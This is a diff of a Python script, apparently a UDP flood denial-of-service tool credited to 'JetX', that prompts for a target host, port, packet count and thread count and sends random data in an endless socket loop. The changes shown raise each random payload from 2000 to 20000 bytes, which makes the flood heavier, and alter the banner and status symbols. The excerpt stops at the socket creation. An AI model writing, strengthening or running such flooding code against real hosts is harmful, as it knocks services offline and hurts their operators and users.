@@ -1,16 +1,17 @@
+
 import random
 import socket
 import threading
 
-print("--> C0de By JetX<--")
+print("#-- remake By JetX --#")
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
 times = int(input(" Packets per one connection:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(2000)
-	i = random.choice(("[+]"))
+	data = random._urandom(20000)
+	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
